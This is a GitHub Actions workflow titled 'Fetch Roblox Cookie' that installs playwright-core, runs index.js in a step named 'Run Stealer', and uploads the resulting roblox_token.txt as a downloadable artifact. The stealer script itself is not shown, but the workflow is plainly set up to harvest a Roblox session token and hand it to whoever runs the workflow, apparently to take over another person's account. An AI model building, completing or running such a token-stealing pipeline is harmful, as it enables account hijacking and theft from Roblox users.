name: Fetch Roblox Cookie

on:
  workflow_dispatch:

jobs:
  fetch-cookie:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: '20'

      - name: Install Dependencies
        run: npm install playwright-core

      - name: Run Stealer
        run: node index.js

      # UPDATED TO v4
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: roblox-token
          path: ./roblox_token.txt
